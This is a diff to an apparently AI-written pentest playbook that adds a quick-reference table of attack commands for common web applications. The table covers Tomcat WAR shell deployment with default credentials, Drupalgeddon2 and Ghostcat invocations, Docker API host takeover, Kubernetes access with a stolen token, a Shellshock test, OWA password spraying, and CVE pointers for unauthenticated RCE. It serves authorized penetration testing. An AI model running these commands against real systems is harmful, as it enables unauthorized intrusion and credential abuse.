@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting]].
+Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting (XSS)]].
 
 ---
 
@@ -1321,6 +1321,46 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 
 ---
 
+## Quick Reference
+
+| App | Goal | Command |
+|---|---|---|
+| WordPress | Full enum | `wpscan --url http://target.com --enumerate u,ap,at,tt,cb,dbe` |
+| WordPress | User enum (unauth) | `curl http://target.com/wp-json/wp/v2/users` |
+| Joomla | Version | `curl -s http://target.com/administrator/manifests/files/joomla.xml \| grep '<version>'` |
+| Joomla | Scan | `droopescan scan joomla --url http://target.com/` |
+| Drupal | Version | `curl -s http://target.com/CHANGELOG.txt \| head -5` |
+| Drupal | Drupalgeddon2 | `python3 drupalgeddon2.py http://target.com` |
+| Tomcat | Brute manager creds | `msf: auxiliary/scanner/http/tomcat_mgr_login` |
+| Tomcat | WAR deploy (curl) | `curl -u tomcat:tomcat "http://target:8080/manager/text/deploy?path=/shell&update=true" --upload-file shell.war` |
+| Tomcat | Ghostcat LFI | `python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml` |
+| Jenkins | RCE | `/script` Groovy Script Console |
+| Jenkins | File read CVE | CVE-2024-23897 (CLI parser arbitrary file read) |
+| Splunk | REST API check | `curl -k https://target.com:8089/services/server/info` |
+| Splunk | RCE via app upload | Manage Apps → Install app from file (reverse shell app) |
+| PRTG | Command injection | CVE-2018-9276 via Notifications → execute program |
+| GitLab | Unauth RCE | CVE-2021-22205 (ExifTool image parsing, < 13.10.3) |
+| Nagios XI | Auth'd command injection | CVE-2021-25296/25297/25298 |
+| Nagios XI | SQLi (unauth) | `sqlmap -u '.../banner_message-ajaxhelper.php?...' --batch` |
+| Exchange/OWA | Password spray | `Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'X'` |
+| Exchange/OWA | Unauth RCE | ProxyLogon (CVE-2021-26855+27065) / ProxyShell (CVE-2021-34473) |
+| Citrix NetScaler | Unauth RCE | CVE-2023-3519 (< 13.1-49.13) |
+| Citrix NetScaler | Session hijack | Citrix Bleed CVE-2023-4966 |
+| F5 BIG-IP | Unauth RCE | CVE-2022-1388 via iControl REST `/mgmt/tm/util/bash` |
+| Ivanti/Pulse | File read | CVE-2019-11510 (< 8.1R15.1) |
+| Palo Alto GlobalProtect | Unauth RCE | CVE-2024-3400 (< 11.1.2-h3) |
+| Fortinet | Auth bypass | CVE-2022-40684 (add admin SSH key) |
+| ManageEngine | Unauth RCE (SAML) | CVE-2022-47966 |
+| TeamCity | Auth bypass → admin | CVE-2024-27198 |
+| Docker API | RCE (exposed 2375) | `docker -H tcp://target:2375 run -it --rm -v /:/host alpine chroot /host sh` |
+| Kubernetes | Enum with stolen token | `kubectl --server=https://target:6443 --token=<t> --insecure-skip-tls-verify get pods -A` |
+| Zimbra | Unauth RCE | CVE-2022-41352 (cpio extract, < 9.0.0.p29) |
+| SolarWinds Orion | Auth bypass | `curl 'https://target:8787/WebResource.axd?SolarWindsOrionAccountID=Admin'` |
+| CGI/Shellshock | Test | `curl -H "User-Agent: () { :; }; echo vulnerable" http://target.com/cgi-bin/status` |
+| ColdFusion | Path traversal → creds | CVE-2010-2861 (`password.properties` disclosure) |
+
+---
+
 *Created: 2026-03-20*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
